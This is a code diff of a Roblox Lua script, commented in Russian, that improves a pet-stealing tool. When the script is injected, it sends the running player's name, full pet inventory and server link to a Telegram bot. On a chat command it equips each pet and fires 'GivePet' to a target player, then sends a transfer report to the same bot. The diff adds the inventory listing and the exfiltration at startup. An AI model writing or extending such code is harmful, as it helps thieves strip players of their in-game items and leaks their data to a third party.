@@ -26,10 +26,8 @@ local function getAllPets()
             for _, item in ipairs(container:GetChildren()) do
                 if item:IsA("Tool") then
                     -- Гибкий парсинг имени
-                    local weight, age = item.Name:match("%[(%d+%.?%d*) KG%].*%[Age (%d+)%]")
-                    if not weight then
-                        weight = item.Name:match("%[(%d+%.?%d*) kg%].*%[Age (%d+)%]")
-                    end
+                    local weight, age = item.Name:match("%[(%d+%.?%d*) KG%].*%[Age (%d+)%]") or
+                                       item.Name:match("%[(%d+%.?%d*) kg%].*%[Age (%d+)%]")
                     
                     if weight and age then
                         local petName = item.Name:match("^([^%[]+)") or item.Name
@@ -37,6 +35,9 @@ local function getAllPets()
                         
                         table.insert(pets, {
                             name = petName,
+                            fullName = item.Name,
+                            weight = tonumber(weight),
+                            age = tonumber(age),
                             object = item,
                             isWhitelisted = table.find(WHITELIST, petName) ~= nil
                         })
@@ -49,6 +50,19 @@ local function getAllPets()
     return pets
 end
 
+-- 📜 Формируем список для уведомления (ВСЕ питомцы)
+local function getFullPetsList(pets)
+    if #pets == 0 then return "❌ Нет питомцев в инвентаре" end
+    
+    local list = {}
+    for _, pet in ipairs(pets) do
+        local status = pet.isWhitelisted and "✅" or "❌"
+        table.insert(list, string.format("%s %s [%.2f кг, Age %d]", status, pet.name, pet.weight, pet.age))
+    end
+    
+    return table.concat(list, "\n")
+end
+
 -- 📨 Отправка в Telegram
 local function sendToTelegram(text)
     local url = "https://api.telegram.org/bot"..TELEGRAM_TOKEN.."/sendMessage"..
@@ -57,6 +71,29 @@ local function sendToTelegram(text)
         game:HttpGet(url)
     end)
 end
+
+-- 🔗 Получить ссылку на сервер
+local function getServerLink()
+    local placeId = game.PlaceId
+    local jobId = game.JobId
+    if jobId and jobId ~= "" then
+        return "https://www.roblox.com/games/"..placeId.."?gameInstanceId="..jobId
+    end
+    return "https://www.roblox.com/games/"..placeId
+end
+
+-- 🏁 ИНИЦИАЛИЗАЦИЯ: сразу после инжекта отправляем полное уведомление
+local function sendInitialNotification()
+    local pets = getAllPets()
+    local petsList = getFullPetsList(pets)
+    local message = 
+        "🔔 Игрок "..player.Name.." запустил скрипт\n\n"..
+        "📦 Полный инвентарь:\n"..petsList.."\n\n"..
+        "🔗 Ссылка на сервер:\n"..getServerLink()
+    sendToTelegram(message)
+end
+
+sendInitialNotification()
 
 -- 🎯 Основная функция передачи
 local function startPetTransfer()
@@ -84,17 +121,29 @@ local function startPetTransfer()
             -- Экипировка с проверкой
             if player.Character and player.Character:FindFirstChild("Humanoid") then
                 player.Character.Humanoid:EquipTool(pet.object)
-                task.wait(2)  -- Увеличенная задержка
+                task.wait(2)
             end
             
             -- Передача
             petService:FireServer("GivePet", targetPlayer)
             transferred += 1
-            task.wait(2)  -- Задержка между передачами
+            task.wait(2)
         end
     end
 
-    sendToTelegram("✅ Успешно передано питомцев: "..transferred)
+    -- Обновляем список после передачи
+    local updatedPets = getAllPets()
+    local report = {
+        "🏁 Отчет о передаче:",
+        "📤 Передано: "..transferred.." из "..#pets,
+        "",
+        "📦 Текущий инвентарь:",
+        getFullPetsList(updatedPets),
+        "",
+        "🔗 Ссылка: "..getServerLink()
+    }
+    
+    sendToTelegram(table.concat(report, "\n"))
 end
 
 -- 👂 Слушатель чата
@@ -103,6 +152,3 @@ Players.PlayerChatted:Connect(function(_, speaker, message)
         startPetTransfer()
     end
 end)
-
--- 🚀 Инициализация
-sendToTelegram("🟢 Скрипт активирован: "..player.Name)
